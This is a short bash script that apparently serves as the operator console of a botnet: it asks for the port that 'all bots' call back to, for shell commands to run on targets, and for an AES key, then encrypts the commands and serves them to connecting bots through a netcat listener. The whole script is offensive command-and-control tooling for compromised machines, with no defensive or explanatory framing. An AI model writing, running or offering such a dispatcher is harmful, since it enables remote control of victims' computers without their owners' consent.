#!/bin/bash

echo "[+] Input Local Port All Bots are Configured to Callback to"
read lport

echo "[+] Input Shell Commands to be Executed on Target (i.e. Bash one liner)"
read shell

echo "[+] Input Path to .aes.key (local or absolute)"
read keypath

echo "$shell" | aescrypt -e -k $keypath - | nc -lnvp $lport
